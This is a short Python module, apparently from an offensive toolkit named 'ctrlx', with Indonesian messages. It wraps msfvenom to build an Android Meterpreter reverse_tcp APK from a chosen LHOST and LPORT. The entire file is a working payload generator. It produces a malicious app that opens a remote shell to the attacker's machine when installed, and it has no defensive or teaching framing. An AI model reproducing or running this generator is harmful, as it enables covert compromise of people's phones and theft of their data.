import argparse
import subprocess
import os

def run(raw_args):
    parser = argparse.ArgumentParser(
        prog="ctrlx axt --type axk",
        description="Generate Android reverse shell payload (.apk) using msfvenom",
        epilog="Contoh: python ctrlx.py axt --type axk --lhost 192.168.1.5 --lport 8080 --save"
    )

    parser.add_argument("--lhost", required=True, help="IP address untuk koneksi balik")
    parser.add_argument("--lport", required=True, help="Port koneksi balik")
    parser.add_argument("--out", help="Nama file output (opsional)")

    args = parser.parse_args(raw_args)

    out_filename = args.out or f"payload_{args.lhost.replace('.', '_')}_{args.lport}.apk"
    out_path = os.path.join("output", "axt", out_filename)
    os.makedirs(os.path.dirname(out_path), exist_ok=True)

    cmd = [
        "msfvenom",
        "-p", "android/meterpreter/reverse_tcp",
        f"LHOST={args.lhost}",
        f"LPORT={args.lport}",
        "-o", out_path
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            return f"[✔] Payload berhasil dibuat:\n{out_path}\n\n[📤] msfvenom Output:\n{result.stdout}"
        else:
            return f"[✖] Gagal membuat payload:\n{result.stderr}"
    except FileNotFoundError:
        return "[!] msfvenom tidak ditemukan. Pastikan Metasploit Framework sudah terinstall."
    except Exception as e:
        return f"[!] Error saat menjalankan msfvenom: {e}"
